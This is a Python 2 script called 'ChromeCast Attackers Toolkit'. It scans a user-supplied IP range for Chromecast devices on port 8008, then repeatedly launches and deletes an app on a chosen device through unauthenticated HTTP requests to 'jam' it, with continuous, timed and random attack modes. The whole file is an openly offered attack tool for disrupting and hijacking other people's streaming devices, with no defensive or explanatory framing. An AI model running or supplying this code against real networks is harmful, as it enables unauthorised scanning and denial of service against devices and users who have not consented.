import socket
import sys
import time
import urllib
import urllib2
import random
import itertools



def IPRange():
	IPlist = []
	print "Input lower bound : "
	lowerboundraw = str(raw_input())
	print "Input upper bound : "
	upperboundraw = str(raw_input())
	lowerboundstrarray = lowerboundraw.split(".")
	upperboundstrarray = upperboundraw.split(".")
	lbint = [0,0,0,0]
	ubint = [0,0,0,0]
	count = 0
	for i in lowerboundstrarray:
		lbint[count] = int(i)
		count += 1
	count = 0
	for i in upperboundstrarray:
		ubint[count] = int(i)+1
		count += 1
	for q,w,e,r in itertools.product(range(lbint[0],256),range(lbint[1],256),range(lbint[2],256),range(lbint[3],256)):
		IPlist.append("{0}.{1}.{2}.{3}".format(q,w,e,r))
		currentIP = "{0}.{1}.{2}.{3}".format(q,w,e,r)
		ubintIP = "{0}.{1}.{2}.{3}".format(int(ubint[0])-1,int(ubint[1])-1,int(ubint[2])-1,int(ubint[3])-1)
		if currentIP == ubintIP:
			return IPlist
			#break



def jam(HOST,PORT,timing,attacktime,delayone,delaytwo):
	timebool = True
	while timebool:
		
		delay = random.randint(int(delayone),int(delaytwo+1))
		
		
		url = 'http://' + HOST + ':' + str(PORT) + '/apps/Songza_App'
		values = {'_':'1111111111111111'}

		data = urllib.urlencode(values)
		reqs = urllib2.Request(url, data)
		resp = urllib2.urlopen(reqs)
		dat = resp.read()
		
		time.sleep(.001)
		
		s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
		s.connect((HOST, PORT))
		req = "DELETE /apps/Songza_App HTTP/1.1\r\nHost: " + HOST + ":" + str(PORT) + "\r\nAccept: */*\r\nContent-Type: application/json\r\n\r\n"
		s.sendall(req)
		data = s.recv(10240)
		
		print data
		print "%d Seconds" % (delay)
		
		time.sleep(delay)
		
		if timing == "1":
			timebool = True
		elif timing == "2":
			timebool = False
		elif timing == "3":
			attacktime -= 1
			if attacktime == 0:
				timebool = False
			else:
				timebool = True
	choose()
		
def chromecast_finder(addresses):
	ccasts = []
	for addr in addresses:
		addr2 = str(addr)
		print addr2
		try :
			request = ("http://"+addr2+":8008/ssdp/device-desc.xml")
			urllib2.urlopen(request, timeout=.5)
			ccasts.append(addr)
			print "*ALERT* We have found a chromecast on the network *ALERT* "
			print ""
			ccasts.append(addr)
		except:
			print "No Chromecast."
			print ""
	print ""
	print ""
	return ccasts		
	
def choose():
	attacktime = 0
	print "What type of attack?"
	print "[1] Continuous"
	print "[2] Short"
	print "[3] Custom time"
	print "[4] Random"
	print "[5] Exit"
	attacklen = raw_input("> ")
	
	if (attacklen != '1') and (attacklen != '2') and (attacklen != '3') and (attacklen != '4') and (attacklen != '5'):
		print 'invalid input'
		print ''
		choose()

	elif attacklen == '5':
		print ''
		print ''
		sys.exit('Closing CCAT')
	else:
		if attacklen == '3':
			attacktime = raw_input("How many times would you like to jam the ChromeCast? (one time is approximately 2-3 seconds.)\n>")
			
		for x in range(0,len(casts) - 1):
			print '['+str(x)+'] '+str(casts[x])
			
		ip_attack = raw_input("Which Chromecast to attack: ")
		ip_attack2 = casts[int(ip_attack)]
		if attacklen != '4':
			delayone = int(raw_input("Delay between jams in seconds\n>"))
			delaytwo = int(delayone) - 1 
		if attacklen == '4':
			delayone = raw_input("Delay between jams\n>")
			delaytwo = raw_input("to\n>")
		while True:
			jam(str(ip_attack2),8008, str(attacklen), int(attacktime),int(delayone),int(delaytwo))
	
	
	
	
	
	
	
print '''















    _      _                  _      _       __ 
   F L    J J      ____      F L    J J     LJ |
   J J .. L L     F __ J     J J .. L L     FJ |
   | |/  \| |    | |--| |    | |/  \| |     J__L
   F   /\   J    F L__J J    F   /\   J      __ 
  J___//\\___L    J\____/F   J___//\\___L     J__L
  |___/  \___|   J______F   |___/  \___|    |__|


ChromeCast Attackers Toolkit

'''




addresses = IPRange()
casts = chromecast_finder(addresses)
choose()
